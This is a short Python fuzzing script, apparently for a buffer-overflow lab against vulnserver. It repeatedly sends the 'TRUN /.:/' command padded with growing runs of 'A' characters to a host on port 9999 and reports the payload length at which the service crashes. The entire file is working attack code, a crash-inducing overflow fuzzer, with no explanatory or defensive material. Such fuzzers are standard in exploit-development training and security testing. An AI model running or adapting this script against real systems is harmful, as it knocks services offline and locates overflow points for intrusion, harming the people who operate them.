import socket
import time
import sys

packetnumber = 100
stringtosend = "TRUN /.:/" + "A" * packetnumber


while True:
    try:
        connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connection.connect(("192.168.31.118",9999))
        bytes = stringtosend.encode(encoding="latin1")
        connection.send(bytes)
        connection.close()

        stringtosend = stringtosend + "A" * packetnumber
        time.sleep(1)
    except KeyboardInterrupt:
        print("Crashed at : " + str(len(stringtosend)))
        sys.exit()
    except Exception as e:
        print("Crashed at : " + str(len(stringtosend)))
        print(e)
        sys.exit()

